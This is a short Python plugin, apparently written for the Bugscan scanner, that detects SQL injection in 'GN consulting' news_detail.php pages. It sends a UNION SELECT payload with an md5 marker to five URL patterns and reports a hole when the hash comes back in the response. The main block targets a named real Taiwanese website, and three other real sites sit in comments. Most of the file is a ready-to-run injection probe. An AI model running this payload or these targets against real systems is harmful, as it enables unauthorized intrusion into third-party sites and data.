#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Designed By GN SQL Injection
#refer:https://www.bugscan.net/#!/x/1997
#__author__ = 'xq17'

def assign(service, arg):
    if service == "gn_consulting":
        return True, arg


def audit(arg):
    urls = [
    "news_detail.php?CID=1&sn=-43",
    "news_detail.php?sn=-7",
    "news_detail.php?pg=4&lang=tw&sn=-18",
    "news_detail.php?PID=1&sn=-9",
    "news_detail.php?CID=2&sn=-92",  
    ]
    for url in urls:
        vul = arg + url + "%27+/*!50000union*/+select+1,2,3,md5(5),5,6,7--%20-"
        code, head, res, errcode, _ = curl.curl2(vul)
        if code!=0 and 'e4da3b7fbbce2345d7772b0674a318d5' in res:
            security_hole(arg + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('gn_consulting','http://www.taiwanfeather.org.tw/')[1])
    # audit(assign('gn_consulting','http://kotobuki-com-tw.e-goodnews.com.tw/')[1])
    # audit(assign('gn_consulting','http://www.tonway.com.tw/')[1])
    # audit(assign('gn_consulting','http://www.e-tain.com.tw/')[1])